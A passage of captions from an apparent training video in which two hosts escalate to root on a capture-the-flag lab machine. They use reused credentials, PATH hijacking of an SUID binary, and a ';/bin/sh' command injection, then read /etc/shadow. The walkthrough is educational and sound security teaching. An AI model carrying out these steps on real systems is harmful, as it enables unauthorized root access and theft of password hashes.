single parentheses,\nwe gotta end with a single parentheses.\n\n107\n00:05:47.970 --> 00:05:51.770\nWe hit Enter, and\nnow my prompt has changed.\n\n108\n00:05:51.770 --> 00:05:53.670\nBecause now I'm in a Bash environment.\n\n109\n00:05:53.670 --> 00:05:55.340\nI'm no longer in a Shell environment.\n\n110\n00:05:55.340 --> 00:05:59.280\nSo now I should have some more\nfunctionality, more features.\n\n111\n00:05:59.280 --> 00:06:01.900\nSo let's see if su will work for us.\n\n112\n00:06:01.900 --> 00:06:03.290\nSu, and we'll say Kent.\n\n113\n00:06:03.290 --> 00:06:06.960\nSo it's asking for Kent's password.\n\n114\n00:06:06.960 --> 00:06:10.320\nWell, luckily I made a list of those\nlovely little passwords that we,\n\n115\n00:06:11.550 --> 00:06:12.840\nremember we had to run through.\n\n116\n00:06:12.840 --> 00:06:14.760\nThey were base 64 encoded.\n\n117\n00:06:14.760 --> 00:06:17.070\nSo let me do an ls down here.\n\n118\n00:06:17.070 --> 00:06:19.336\nI think they were under mysql_users.\n\n119\n00:06:19.336 --> 00:06:21.830\nmysql_users, yeah, there they are.\n\n120\n00:06:25.410 --> 00:06:30.210\nDo a copy and just paste it into there,\nhit enter and\n\n121\n00:06:30.210 --> 00:06:36.080\nnow you'll notice I went\nfrom being www.data to kent,\n\n122\n00:06:36.080 --> 00:06:40.670\nso we're already actually moving\nalong really quickly right?\n\n123\n00:06:40.670 --> 00:06:45.670\nWe've moved from one user into another\nthrough some stolen credentials.\n\n124\n00:06:45.670 --> 00:06:47.880\nSo I mean that's obviously\nprivilege escalation right there.\n\n125\n00:06:47.880 --> 00:06:48.590\n&gt;&gt; Absolutely.\n\n126\n00:06:48.590 --> 00:06:49.990\nYou might be moving horizontal, but\n\n127\n00:06:49.990 --> 00:06:51.450\nwho knows what we can do with kent-\n&gt;&gt; Right.\n\n128\n00:06:51.450 --> 00:06:53.340\n&gt;&gt; That we couldn't do with\nthe one we were currently on.\n\n129\n00:06:53.340 --> 00:06:54.880\nSo it's definitely a good step.\n\n130\n00:06:54.880 --> 00:06:56.860\n&gt;&gt; And that, Mike,\nmakes the perfect point,\n\n131\n00:06:56.860 --> 00:07:00.580\nis that just because you're logged in\nas one user and you can't do such and\n\n132\n00:07:00.580 --> 00:07:05.080\nsuch, if you are able to change\nto other users, maybe they can.\n\n133\n00:07:05.080 --> 00:07:07.150\nSo always try these things.\n\n134\n00:07:07.150 --> 00:07:12.080\nIt's all about exploration, finding\nthe systems, what they can and can not do,\n\n135\n00:07:12.080 --> 00:07:14.300\nand what can you make them do.\n\n136\n00:07:14.300 --> 00:07:18.000\nSo now we're logged in as Kent\nwe should be able do a ls.\n\n137\n00:07:18.000 --> 00:07:20.580\nWhich we can, and\nwe can say CD enter Kent.\n\n138\n00:07:21.840 --> 00:07:25.110\nAnd we'll do an ls.\n\n139\n00:07:25.110 --> 00:07:28.690\nI'll just make sure that\nhe has no hidden files.\n\n140\n00:07:28.690 --> 00:07:32.390\nNope, just standard bash_history,\nbash_logout, bashrc.\n\n141\n00:07:32.390 --> 00:07:33.880\nNothing fancy going on here.\n\n142\n00:07:33.880 --> 00:07:38.830\nSo Kent was a big bust when\nit comes to that kinda stuff,\n\n143\n00:07:38.830 --> 00:07:40.820\nat least as far as we've gotten.\n\n144\n00:07:40.820 --> 00:07:42.760\nLet's jump on and look at the other guys.\n\n145\n00:07:42.760 --> 00:07:44.810\nSee maybe they have something going on.\n\n146\n00:07:46.610 --> 00:07:47.310\nLet's see here.\n\n147\n00:07:47.310 --> 00:07:48.870\nWho else do we have?\n\n148\n00:07:48.870 --> 00:07:50.950\nLet's see here.\n\n149\n00:07:50.950 --> 00:07:53.160\nBack it out here and\ngive me that list of guys.\n\n150\n00:07:53.160 --> 00:07:54.780\nI've got a list of them right here.\n\n151\n00:07:54.780 --> 00:07:56.112\nI'm overlooking everything.\n\n152\n00:07:56.112 --> 00:07:57.284\nThat's nice.\n\n153\n00:07:57.284 --> 00:08:00.290\nLet's try Let's try Mike.\n\n154\n00:08:00.290 --> 00:08:00.908\nMike's sitting right here.\n\n155\n00:08:00.908 --> 00:08:04.190\n[CROSSTALK] [LAUGH]\n&gt;&gt; Shady characters, right?\n\n156\n00:08:04.190 --> 00:08:09.555\nAll right, let's su to Mike and\nget his password.\n\n157\n00:08:13.383 --> 00:08:16.078\nCopy and paste.\n\n158\n00:08:20.503 --> 00:08:23.154\nAuthentication failure, interesting.\n\n159\n00:08:23.154 --> 00:08:24.360\nVery, very interesting.\n\n160\n00:08:25.590 --> 00:08:29.121\nSo, maybe that's his password for\nlogging into the web server.\n\n161\n00:08:29.121 --> 00:08:31.825\nMaybe it's not his password for\nlogging into here.\n\n162\n00:08:31.825 --> 00:08:34.310\n&gt;&gt; Or he changed his password\nsince we obtained them?\n\n163\n00:08:34.310 --> 00:08:35.510\n&gt;&gt; Could be, let's see here.\n\n164\n00:08:35.510 --> 00:08:36.793\nWhat else do we wanna do here?\n\n165\n00:08:38.739 --> 00:08:41.540\n&gt;&gt; Let's try Keane, we got Keane.\n\n166\n00:08:41.540 --> 00:08:44.200\nThat's our last user that\nI have a password for.\n\n167\n00:08:44.200 --> 00:08:46.120\nSo, I'm kinda running out of options here.\n\n168\n00:08:46.120 --> 00:08:49.002\nSo let's see here, SU to Keane.\n\n169\n00:08:49.002 --> 00:08:57.180\nLet's copy his password,\nPaste it in return.\n\n170\n00:08:57.180 --> 00:08:58.259\nOkay, Keane's good.\n\n171\n00:08:58.259 --> 00:09:00.029\nWe got logged as him.\n\n172\n00:09:00.029 --> 00:09:01.272\nThat's excellent.\n\n173\n00:09:01.272 --> 00:09:05.121\nDo an ls, cd into Keane, do an ls.\n\n174\n00:09:05.121 --> 00:09:07.350\nI just got some files here.\n\n175\n00:09:07.350 --> 00:09:11.420\nThat's interesting, he has cats in here.\n\n176\n00:09:11.420 --> 00:09:12.820\nls is not a part of the file system.\n\n177\n00:09:12.820 --> 00:09:17.340\nIt's just kind of basically\nreiterating what commands I've sent.\n\n178\n00:09:17.340 --> 00:09:22.084\nSo it's just a quirk of working in\nthe environment that we're working in.\n\n179\n00:09:22.084 --> 00:09:26.251\nLet's do an ls-al just to make\nsure that everything looks good.\n\n180\n00:09:26.251 --> 00:09:27.210\nSo this is interesting.\n\n181\n00:09:27.210 --> 00:09:27.990\nSo he's got CAT.\n\n182\n00:09:27.990 --> 00:09:31.430\nCAT is a command in Linux to concatenate.\n\n183\n00:09:31.430 --> 00:09:34.200\nBasically, show me what's inside\nof this file is what it does.\n\n184\n00:09:34.200 --> 00:09:39.605\nBut his is saying he's\nrunning as Keane here, right?\n\n185\n00:09:39.605 --> 00:09:43.230\nRRWX-RD everybody's got full\ncontrol of this CAT file.\n\n186\n00:09:44.480 --> 00:09:46.726\nI know why cuz I created it.\n\n187\n00:09:46.726 --> 00:09:51.591\nAnd for good reasons because if you look\n\n188\n00:09:51.591 --> 00:09:55.724\ndown here, we got this msg mike.\n\n189\n00:09:55.724 --> 00:09:57.893\nAnd look who's running.\n\n190\n00:09:57.893 --> 00:10:00.670\nWho's the owner, who's the group owner?\n\n191\n00:10:00.670 --> 00:10:03.216\nAnd you see this little s right here?\n\n192\n00:10:03.216 --> 00:10:07.920\nThat's not the r,\nthat's a little too much.\n\n193\n00:10:07.920 --> 00:10:09.703\nBut that's the SUID.\n\n194\n00:10:09.703 --> 00:10:14.269\nThat's a bit you set when\nyou set permissions to allow\n\n195\n00:10:14.269 --> 00:10:17.830\nthings to be run as other users.\n\n196\n00:10:17.830 --> 00:10:22.513\nSo this is a file that Mike owns.\n\n197\n00:10:22.513 --> 00:10:24.647\nHe's the owner of it and\nhe's the group owner of it.\n\n198\n00:10:24.647 --> 00:10:26.910\nAnd he's allowing other\npeople to execute it.\n\n199\n00:10:26.910 --> 00:10:28.989\nCuz you'll notice you got the rx here.\n\n200\n00:10:28.989 --> 00:10:30.660\nBut it's running as himself.\n\n201\n00:10:31.680 --> 00:10:34.300\nThat's what that S is for, the SUID.\n\n202\n00:10:34.300 --> 00:10:39.640\nSo any user, cuz that's what we see here,\nhas read and\n\n203\n00:10:39.640 --> 00:10:44.490\nexecute, but when that executes,\nit runs as Mike.\n\n204\n00:10:45.590 --> 00:10:46.970\nPrivilege escalation anyone?\n\n205\n00:10:46.970 --> 00:10:48.560\nThat's what we're looking for, okay?\n\n206\n00:10:49.830 --> 00:10:51.400\nSo let's see here.\n\n207\n00:10:51.400 --> 00:10:53.240\nLet's actually run the file and\nsee what it does.\n\n208\n00:10:54.850 --> 00:10:57.031\nI might actually have to remove that cat.\n\n209\n00:10:57.031 --> 00:10:58.666\nLet me rename that here.\n\n210\n00:10:58.666 --> 00:11:00.284\nSo I'll copy cat.\n\n211\n00:11:00.284 --> 00:11:04.628\nWe'll call it cat2, and then we'll rm cat.\n\n212\n00:11:07.210 --> 00:11:10.694\nLet's do this ./msgmike.\n\n213\n00:11:12.320 --> 00:11:16.360\nAnd it's running, and it calls cat.\n\n214\n00:11:16.360 --> 00:11:19.550\nSo now you're probably saying\nagain I Tarantino-ed it for\n\n215\n00:11:19.550 --> 00:11:22.730\nyou, gave you a little\npreview of what's to come.\n\n216\n00:11:22.730 --> 00:11:24.510\nAnd then we go back and\nwe see what's going on.\n\n217\n00:11:24.510 --> 00:11:27.808\nSo this script,\nit's basically a script, right?\n\n218\n00:11:27.808 --> 00:11:30.897\nObviously, because there's the thing.\n\n219\n00:11:30.897 --> 00:11:37.645\nWe can cat that, cat msgmike, man,\nit's just a whole bunch of craziness.\n\n220\n00:11:37.645 --> 00:11:43.155\nSo it's a script that is not a bad script,\nit's something else.\n\n221\n00:11:43.155 --> 00:11:46.381\nWe can do things like\nrun strings at it maybe.\n\n222\n00:11:46.381 --> 00:11:52.308\nSo like string strings, look for\nstrings inside it, msgmike and\n\n223\n00:11:52.308 --> 00:11:58.129\njust look through there and\nsee if anything looks interesting,\n\n224\n00:11:58.129 --> 00:12:02.686\nuser names, passwords,\nthings of that nature.\n\n225\n00:12:02.686 --> 00:12:06.814\nA lot of information there but\n\n226\n00:12:06.814 --> 00:12:11.610\nnothing crazy, except for this.\n\n227\n00:12:12.880 --> 00:12:13.555\nLook at that.\n\n228\n00:12:13.555 --> 00:12:17.084\nSo it's calling cat to look\nat a file home Mike, so\n\n229\n00:12:17.084 --> 00:12:20.120\nit's looking in Mike's home directory.\n\n230\n00:12:20.120 --> 00:12:21.250\nThat's why it needs to run as Mike.\n\n231\n00:12:21.250 --> 00:12:23.960\nThat's why that SUID bit has been set.\n\n232\n00:12:23.960 --> 00:12:29.220\nBecause it is looking at a file that,\nnormally, I wouldn't have permission to.\n\n233\n00:12:29.220 --> 00:12:32.360\nAnd it's message.text, all right?\n\n234\n00:12:32.360 --> 00:12:34.915\nSo it's catting that and then outputting.\n\n235\n00:12:34.915 --> 00:12:35.690\nSo let's run it again.\n\n236\n00:12:35.690 --> 00:12:41.210\nThat's msgmike and it's saying that\nthere is no such file or directory.\n\n237\n00:12:41.210 --> 00:12:44.950\nSo it's just saying that\nmsg.text is not there.\n\n238\n00:12:44.950 --> 00:12:49.267\nBut it tried to look at it and\nit ran as Mike to do so, okay?\n\n239\n00:12:49.267 --> 00:12:51.070\nVery interesting.\n\n240\n00:12:51.070 --> 00:12:54.980\nSo what happens, cuz you'll notice\nthere is no full path here.\n\n241\n00:12:54.980 --> 00:12:56.990\nIt just calls the cat command.\n\n242\n00:12:56.990 --> 00:12:59.299\nIt doesn't say /bin /cat.\n\n243\n00:12:59.299 --> 00:13:02.160\nIt says, cat.\n\n244\n00:13:02.160 --> 00:13:04.950\nWell now, you're starting to see.\n\n245\n00:13:04.950 --> 00:13:06.630\nI can create my own cat command.\n\n246\n00:13:06.630 --> 00:13:08.680\nLet's do that.\nLet's take a look at what I did.\n\n247\n00:13:08.680 --> 00:13:11.627\nCat cat2 [LAUGH] which is funny.\n\n248\n00:13:11.627 --> 00:13:14.162\nBut what is this doing?\n\n249\n00:13:14.162 --> 00:13:19.720\nI created a shell script that does what?\n\n250\n00:13:19.720 --> 00:13:20.500\nGives me a shell.\n\n251\n00:13:20.500 --> 00:13:21.470\n&gt;&gt; Gives you a shell, yeah.\n\n252\n00:13:21.470 --> 00:13:23.280\n&gt;&gt; And who's gonna run that shell?\n\n253\n00:13:23.280 --> 00:13:24.523\nWho's gonna spawn that shell?\n\n254\n00:13:24.523 --> 00:13:26.210\n&gt;&gt; Looks like it's gonna run under Mike.\n\n255\n00:13:26.210 --> 00:13:26.850\n&gt;&gt; That's exactly right.\n\n256\n00:13:26.850 --> 00:13:27.840\n&gt;&gt; It's gonna run as Mike.\n\n257\n00:13:27.840 --> 00:13:32.490\nSo if I rename that file,\nif I copy cat2 and\n\n258\n00:13:34.050 --> 00:13:39.290\nI call it cats, there we go.\n\n259\n00:13:39.290 --> 00:13:40.570\nDo an ls, this should be cat.\n\n260\n00:13:40.570 --> 00:13:43.217\nI'll remove cat2.\n\n261\n00:13:43.217 --> 00:13:47.170\nThere we go,\nls now it's just cat and msgmike.\n\n262\n00:13:47.170 --> 00:13:51.106\nThere's our malicious CAT file,\n\n263\n00:13:51.106 --> 00:13:55.318\nour CAT program that spawns a shell.\n\n264\n00:13:55.318 --> 00:13:57.477\nBecause if I run CAT, what's gonna run?\n\n265\n00:13:57.477 --> 00:13:58.810\nBin CAT.\n\n266\n00:13:58.810 --> 00:13:59.570\nIt's gonna run.\n\n267\n00:13:59.570 --> 00:14:03.185\nI need to add it to the variable path,\nthe path, right?\n\n268\n00:14:03.185 --> 00:14:07.183\nIf you do echo path, that path variable,\n\n269\n00:14:07.183 --> 00:14:11.070\nanything inside of these directories,\n\n270\n00:14:11.070 --> 00:14:16.230\nyou don't have give the full directory,\nall right?\n\n271\n00:14:16.230 --> 00:14:19.815\nThat's why he can call cat and\nit works because that's in that path.\n\n272\n00:14:19.815 --> 00:14:23.434\nWhat we wanna do we wanna modify that path\nso it looks where we want it to look,\n\n273\n00:14:23.434 --> 00:14:26.220\nwhich is our Keane directory\ncuz that's where we're at.\n\n274\n00:14:27.260 --> 00:14:30.410\nSo I'm gonna copy this.\n\n275\n00:14:30.410 --> 00:14:33.380\nCopy this out here cuz I'm\ngonna wanna set it back.\n\n276\n00:14:34.500 --> 00:14:35.868\nCopy that.\n\n277\n00:14:35.868 --> 00:14:43.184\nAnd then I'm gonna say,\nPath equals, I'm just\n\n278\n00:14:43.184 --> 00:14:49.730\ngonna follow my nose cuz I don't wanna\nget lost on myself here, /home/keane.\n\n279\n00:14:49.730 --> 00:14:53.775\nSo now,\nwhen that cat program gets called off,\n\n280\n00:14:53.775 --> 00:14:57.830\nI just enter return and\nI do echo path like that.\n\n281\n00:14:57.830 --> 00:15:01.496\nYou'll notice, now it says home/kane and\nnot all these other,\n\n282\n00:15:01.496 --> 00:15:05.850\nuser games, user /local/games,\nbin, user /bin, user/local/bin.\n\n283\n00:15:05.850 --> 00:15:07.450\nThose aren't gonna be working.\n\n284\n00:15:07.450 --> 00:15:08.450\nIt's not looking there anymore.\n\n285\n00:15:08.450 --> 00:15:11.110\nIt's looking inside of kane's directory.\n\n286\n00:15:11.110 --> 00:15:11.710\nAnd that's my path.\n\n287\n00:15:11.710 --> 00:15:15.058\nSo when I now fire off,\n\n288\n00:15:15.058 --> 00:15:19.474\nthat's msgmike so msgmike.\n\n289\n00:15:19.474 --> 00:15:24.383\nYou'll notice that my prompt changed\nagain because Mike's user account fired\n\n290\n00:15:24.383 --> 00:15:29.140\noff a shell, which is just a little\ndollar sign and now what do we gotta do?\n\n291\n00:15:29.140 --> 00:15:33.250\nWell, we gotta spawn a bash shell yet\nagain.\n\n292\n00:15:33.250 --> 00:15:35.289\nBut first,\nwe gotta set our path back because-.\n\n293\n00:15:36.300 --> 00:15:41.540\n&gt;&gt; There are no other [LAUGH]\n[CROSSTALK] Yeah, there are no working\n\n294\n00:15:41.540 --> 00:15:47.250\nbinaries inside of the Keane directory so\nwe need to export path.\n\n295\n00:15:47.250 --> 00:15:50.089\nNo, we don't need path\njust say path equals.\n\n296\n00:15:50.089 --> 00:15:51.472\nI don't need to export it.\n\n297\n00:15:51.472 --> 00:15:56.542\nPath equals and then just paste\nthat in what it was before.\n\n298\n00:15:56.542 --> 00:15:57.304\nAnd there we go.\n\n299\n00:15:57.304 --> 00:16:02.256\nSo now we can echo $path,\nit should be back to that.\n\n300\n00:16:02.256 --> 00:16:04.620\nNow we can go back to using normal stuff.\n\n301\n00:16:06.270 --> 00:16:08.870\nSo that being said,\nlet's see here that's right,\n\n302\n00:16:08.870 --> 00:16:10.520\nwe need to spawn our batch shell again.\n\n303\n00:16:10.520 --> 00:16:12.890\nSo our good old python.\n\n304\n00:16:12.890 --> 00:16:18.961\nPython, not python,\n[LAUGH] that's strange.\n\n305\n00:16:18.961 --> 00:16:23.512\n-c, import, pTy, pTy, .spawn,\n\n306\n00:16:23.512 --> 00:16:29.069\nP-A-W, man my typing skills need dusting.\n\n307\n00:16:29.069 --> 00:16:34.270\nLet's see here, /bin/bash,\nand there we go.\n\n308\n00:16:34.270 --> 00:16:36.840\nThere we go.\nNow look at my prompt.\n\n309\n00:16:36.840 --> 00:16:37.510\n&gt;&gt; Wow.\n\n310\n00:16:37.510 --> 00:16:38.270\n&gt;&gt; Logged in as Mike.\n\n311\n00:16:38.270 --> 00:16:40.829\nSo now we've done another\nprivilege escalation, right?\n\n312\n00:16:40.829 --> 00:16:48.330\nSo we went from www-data to\nlogging in as Kent and Cain.\n\n313\n00:16:48.330 --> 00:16:50.860\nCain got us to where we\ncould log in as Mike.\n\n314\n00:16:52.050 --> 00:16:57.116\nWhat was so special about Mike that we\ncouldn't get at his home directory?\n\n315\n00:16:57.116 --> 00:16:58.174\nLet's jump in there and see.\n\n316\n00:16:58.174 --> 00:16:59.300\n&gt;&gt; No.\n&gt;&gt; Let's see here.\n\n317\n00:16:59.300 --> 00:17:00.256\n&gt;&gt; Cut the feed.\n\n318\n00:17:00.256 --> 00:17:00.968\n&gt;&gt; That's right.\n\n319\n00:17:00.968 --> 00:17:05.034\n[LAUGH] /home/mike Mike,\nwhat are you hiding here?\n\n320\n00:17:05.034 --> 00:17:07.080\n&gt;&gt; [LAUGH]\n&gt;&gt; Okay, so\n\n321\n00:17:07.080 --> 00:17:12.240\nMike has a file,\nalways check for hidden files.\n\n322\n00:17:12.240 --> 00:17:13.150\nNo hidden files there.\n\n323\n00:17:13.150 --> 00:17:19.100\nWe have this cool message to root again,\nlook at that.\n\n324\n00:17:19.100 --> 00:17:22.970\n&gt;&gt; SUID has been set yet again and\n\n325\n00:17:22.970 --> 00:17:28.220\nthis time look who\nthe owner of that file is.\n\n326\n00:17:28.220 --> 00:17:30.590\n&gt;&gt; So rinse and\nrepeat basically the same steps.\n\n327\n00:17:30.590 --> 00:17:35.070\nIt's what Kent had to get to Mike and\nnow Mike has it to get to root.\n\n328\n00:17:35.070 --> 00:17:36.600\n&gt;&gt; Right well it, we'll see.\n\n329\n00:17:36.600 --> 00:17:37.820\nWe don't know what this does.\n\n330\n00:17:37.820 --> 00:17:41.120\nLet's take a look at this\nmessage to root file.\n\n331\n00:17:41.120 --> 00:17:42.660\nMaybe that'll give us something here.\n\n332\n00:17:42.660 --> 00:17:45.950\nso we'll catmsg to root.\n\n333\n00:17:45.950 --> 00:17:49.140\nI can't use my tab\nautocomplete this terminal.\n\n334\n00:17:49.140 --> 00:17:50.940\nThere we go.\nAgain we're dealt with that.\n\n335\n00:17:52.380 --> 00:17:54.530\nWe got some good stuff\nout of strings before.\n\n336\n00:17:54.530 --> 00:17:55.298\nLet's try that.\n\n337\n00:18:00.159 --> 00:18:02.930\nStrings, msg, no,\nwas it message to root, right?\n\n338\n00:18:02.930 --> 00:18:05.440\nI can't remember the name of thing.\n\n339\n00:18:05.440 --> 00:18:05.940\nYeah.\n&gt;&gt; Msg to root.\n\n340\n00:18:05.940 --> 00:18:07.781\n&gt;&gt; Message to root, there we go.\n\n341\n00:18:07.781 --> 00:18:10.687\nSo strings,\n\n342\n00:18:10.687 --> 00:18:13.988\nmsg2root.\nAll right,\n\n343\n00:18:13.988 --> 00:18:15.920\nlet's look through it really quickly,\nsee if anything.\n\n344\n00:18:17.924 --> 00:18:19.295\nLooks awesome.\n\n345\n00:18:22.577 --> 00:18:25.310\nMoving through, nothing so far.\n\n346\n00:18:28.280 --> 00:18:29.280\nLot of stuff gone.\n\n347\n00:18:29.280 --> 00:18:32.670\nOkay, here we go,\ngot a little action here.\n\n348\n00:18:32.670 --> 00:18:33.974\nMessage for root.\n\n349\n00:18:33.974 --> 00:18:42.660\nBin echo percent s and then its\nappending a file root messages dot text.\n\n350\n00:18:42.660 --> 00:18:45.930\nAgain hence basically yeah,\nsame kind of problem that happened with\n\n351\n00:18:45.930 --> 00:18:51.120\nMike is happening here,\nis that they're calling echo.\n\n352\n00:18:51.120 --> 00:18:54.970\nThis time they're actually using a full\npath though, so we can't use the same,\n\n353\n00:18:54.970 --> 00:18:58.850\nwe'll just make our own echo command and\nmake it run.\n\n354\n00:18:58.850 --> 00:19:01.020\nIt's actually looking to bin echo, and\n\n355\n00:19:01.020 --> 00:19:06.180\nwe don't have the privileges to go into\nbin, delete echo, and create our own echo.\n\n356\n00:19:06.180 --> 00:19:08.820\nThat's under system authority, right?\n\n357\n00:19:08.820 --> 00:19:15.130\nSo that's not gonna be helpful,\nbut it is doing something with %s.\n\n358\n00:19:15.130 --> 00:19:16.990\nLet's run the file and\njust see what it does.\n\n359\n00:19:16.990 --> 00:19:19.490\nThat's probably a good spot at this point.\n\n360\n00:19:19.490 --> 00:19:24.480\nLet's see, msg to I can't do it.\n\n361\n00:19:24.480 --> 00:19:28.140\nWhat is it,\n\n362\n00:19:28.140 --> 00:19:32.171\nmsg2root.\n\n363\n00:19:32.171 --> 00:19:34.640\nSo it's taking user input.\n\n364\n00:19:34.640 --> 00:19:36.460\nI guess that's what that %s was for.\n\n365\n00:19:36.460 --> 00:19:39.500\nIt's looking for a variable.\n\n366\n00:19:39.500 --> 00:19:46.090\nSo okay, message for root,\nwe'll say hello root.\n\n367\n00:19:46.090 --> 00:19:47.441\nHello root, and there we go.\n\n368\n00:19:47.441 --> 00:19:52.553\nSo basically, and\nwe saw up above in our strings,\n\n369\n00:19:52.553 --> 00:19:57.710\nthat's getting saved\ninto rootmessages.txt.\n\n370\n00:19:57.710 --> 00:20:01.210\nSo root logs in, he checks messages\n.txt to see if there's anything there.\n\n371\n00:20:01.210 --> 00:20:04.360\nSo maybe Mike was,\nI'm having trouble uploading a file.\n\n372\n00:20:04.360 --> 00:20:05.840\nCan you check this out?\n\n373\n00:20:05.840 --> 00:20:07.300\nAnd you can do that message to root thing,\nand\n\n374\n00:20:07.300 --> 00:20:10.100\nit would save it in the directory,\nin that file.\n\n375\n00:20:10.100 --> 00:20:12.270\nOkay, that's moving us along.\n\n376\n00:20:13.800 --> 00:20:15.440\nSo that being said, where are we here?\n\n377\n00:20:15.440 --> 00:20:19.130\nI'm gonna make sure I'm\nfollowing my own notes here.\n\n378\n00:20:19.130 --> 00:20:21.820\nWe saw that the SU ID,\neverything is working great.\n\n379\n00:20:24.476 --> 00:20:29.360\nWhat I do think is happening\nhere is that this is probably.\n\n380\n00:20:29.360 --> 00:20:30.520\nBecause what is it doing?\n\n381\n00:20:30.520 --> 00:20:31.860\nIt's calling a command.\n\n382\n00:20:31.860 --> 00:20:34.130\n&gt;&gt; And it's writing to\na protected location, right?\n\n383\n00:20:34.130 --> 00:20:36.530\nOr at least a location that\nroot has permissions for.\n\n384\n00:20:36.530 --> 00:20:38.310\n&gt;&gt; That's very correct.\n\n385\n00:20:38.310 --> 00:20:39.725\nYou're getting a two-for-one sale here.\n\n386\n00:20:39.725 --> 00:20:41.400\n&gt;&gt; [LAUGH]\n&gt;&gt; We're not only gonna do privilege\n\n387\n00:20:41.400 --> 00:20:42.010\nescalation but\n\n388\n00:20:42.010 --> 00:20:45.330\nI'm gonna introduce you to a little\nsomething called command injection.\n\n389\n00:20:45.330 --> 00:20:45.930\nRight?\nBecause\n\n390\n00:20:45.930 --> 00:20:48.300\nwe have a command that is running, right?\n\n391\n00:20:48.300 --> 00:20:51.600\nAnd it's properly identified, but\n\n392\n00:20:51.600 --> 00:20:54.340\nI wonder if it's going to stop me\nfrom running multiple commands.\n\n393\n00:20:54.340 --> 00:20:58.100\nIf you don't know this about Linux, you\ncan string commands together on one line.\n\n394\n00:20:58.100 --> 00:21:01.960\nYou just use a semi-colon\nto delineate the commands.\n\n395\n00:21:01.960 --> 00:21:06.130\nSo I could write, cat,\nthen semi-colon, who am I?.\n\n396\n00:21:06.130 --> 00:21:11.050\nAnd it would CAT or if I CAT a file,\nsemicolon, who am I.\n\n397\n00:21:11.050 --> 00:21:13.900\nIt would CAT the file and\nthen show me the output of who I am.\n\n398\n00:21:15.090 --> 00:21:15.620\nPretty simple.\n\n399\n00:21:15.620 --> 00:21:17.310\nIt's a very easy thing to do.\n\n400\n00:21:17.310 --> 00:21:19.570\nThis looks ripe for that.\n\n401\n00:21:19.570 --> 00:21:20.430\nSo let's give it a whirl.\n\n402\n00:21:20.430 --> 00:21:21.900\nLet's see what happens.\n\n403\n00:21:21.900 --> 00:21:27.359\nSo what I'll do is I'll\nrun the message to root,\n\n404\n00:21:27.359 --> 00:21:30.697\nso I'll say ./msg2root.\n\n405\n00:21:30.697 --> 00:21:34.673\nIt asked me for a message to root,\n\n406\n00:21:34.673 --> 00:21:38.520\nI'm gonna say you been hacked.\n\n407\n00:21:38.520 --> 00:21:43.446\nSemicolon, and then let's,\nwhat should we do here?\n\n408\n00:21:43.446 --> 00:21:45.775\nHow about, I don't know, bin sh.\n\n409\n00:21:48.726 --> 00:21:51.030\nI don't know if you've seen\nmy proctor has changed.\n\n410\n00:21:51.030 --> 00:21:56.120\nBut in the Linux world,\nwhen you are the root user of a system,\n\n411\n00:21:56.120 --> 00:22:00.580\nyou get this little hashy sign, the pound\nsign whatever you like to call it.\n\n412\n00:22:00.580 --> 00:22:03.980\nAnd that let's you know, for your prompt,\nyou get that for your prompt.\n\n413\n00:22:03.980 --> 00:22:07.983\nYou'll notice right here, I have a #.\n\n414\n00:22:07.983 --> 00:22:11.800\nIf I say whoami, it tells me I am root.\n\n415\n00:22:12.830 --> 00:22:14.760\nI have successfully rooted this box.\n\n416\n00:22:14.760 --> 00:22:19.630\nAnd we can prove that by doing\nthings like cat/etc/shadow, yeah.\n\n417\n00:22:22.270 --> 00:22:26.590\nThere's all the passwords for the users on\nthis account, I can now download those to\n\n418\n00:22:26.590 --> 00:22:29.970\nmy machine, run my password cracker\non those if hadn't done that already.\n\n419\n00:22:29.970 --> 00:22:33.280\nOr maybe if there were users that\ndidn't get when we did the MySQL stuff,\n\n420\n00:22:33.280 --> 00:22:36.820\nback when we were using the LFI attack.\n\n421\n00:22:36.820 --> 00:22:40.570\nAll right, there could be other users\nthat I want, maybe the, I don't know.\n\n422\n00:22:40.570 --> 00:22:45.830\nThe root password would be nice to\nprobably run through my password cracker.\n\n423\n00:22:45.830 --> 00:22:49.040\nSee if I couldn't gather that, so that\nwe don't have to continually exploit it.\n\n424\n00:22:49.040 --> 00:22:52.240\nJust log in as root whenever\nI feel like it right?\n\n425\n00:22:52.240 --> 00:22:57.340\nAnd I think they actually put a cool\nflag here, so we'll go to roots, being\n\n426\n00:22:57.340 --> 00:23:00.360\nable to get into roots home directory,\nthat's a good sign that your root.\n\n427\n00:23:00.360 --> 00:23:02.048\nOr at least with the privileges to do so.\n\n428\n00:23:02.048 --> 00:23:06.731\nLS dash and there is a flag there,\nlook at that, they gave us a flag,\n\n429\n00:23:06.731 --> 00:23:08.061\nlet's check it out.\n\n430\n00:23:08.061 --> 00:23:13.679\nCat flag.txt, hey hey!\n\n431\n00:23:13.679 --> 00:23:18.513\nCongratulations, if you are reading\nthis is means we have break init Panlab,\n\n432\n00:23:18.513 --> 00:23:19.180\nawesome.\n\n433\n00:23:19.180 --> 00:23:22.095\nIt was a great challenge,\nI enjoyed doing this and\n\n434\n00:23:22.095 --> 00:23:26.191\nenjoyed showing it to you guys because\nit was a perfect explanation and\n\n435\n00:23:26.191 --> 00:23:30.844\nwalk through being able to let you guys\nsee what privilege escalation looks like\n\n436\n00:23:30.844 --> 00:23:35.081\nwhen you're not typically using\nsomething like remote code to do that or\n\n437\n00:23:35.081 --> 00:23:38.300\nlocal exploit that you found\non a database somewhere.\n\n438\n00:23:38.300 --> 00:23:41.640\n&gt;&gt; Fantastic, I don't think I could\nhave summed it up any better myself.\n\n439\n00:23:41.640 --> 00:23:42.770\nSo we appreciate that, Daniel.\n\n440\n00:23:42.770 --> 00:23:43.490\nGreat look there.\n\n441\n00:23:43.490 --> 00:23:47.500\nAgain, just to reiterate let me try\nto sum it up as well as Daniel did.\n\n442\n00:23:47.500 --> 00:23:51.299\nA really good look at how we escalate our\nprivileges in the Linux world because\n\n443\n00:23:51.299 --> 00:23:55.447\na lot of the times the target they were\ntrying to is gonna be a Linux machine and\n\n444\n00:23:55.447 --> 00:23:57.492\nwe are not gonna have\nthat route access and\n\n445\n00:23:57.492 --> 00:23:59.438\nwe really want really indeed to get it.\n\n446\n00:23:59.438 --> 00:24:01.740\nSo we appreciate that,\nwe love the demonstrations,\n\n447\n00:24:01.740 --> 00:24:04.156\nwe hope everybody out there\nenjoyed watching this one.\n\n448\n00:24:04.156 --> 00:24:07.469\nSetting off for ItProTV,\nI've been your host Mike Rodrick.\n\n449\n00:24:07.469 --> 00:24:08.218\n&gt;&gt; And I'm Daniel Lowrey.\n\n450\n00:24:08.218 --> 00:24:09.294\n&gt;&gt; And we'll see you next time.\n\n451\n00:24:09.294 --> 